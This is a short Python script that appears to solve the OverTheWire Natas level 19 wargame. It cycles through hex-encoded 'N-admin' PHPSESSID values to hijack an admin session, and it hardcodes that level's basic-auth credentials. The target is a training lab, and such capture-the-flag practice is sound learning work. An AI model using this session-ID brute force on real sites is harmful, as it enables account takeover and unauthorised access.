import requests

url='http://natas19.natas.labs.overthewire.org/index.php?'

for n in range(1, 641):
  print(n)
  cookies = {'PHPSESSID': (str(n) + '-admin').encode("utf-8").hex()}
  response = requests.get(url, auth = ("natas19", "8LMJEhKFbMKIL2mxQKjv0aEDdk7zpT0s"), cookies = cookies)
  if "Password" in response.content.decode('utf-8'):
    print(response.content.decode('utf-8'))
    print(n)
    break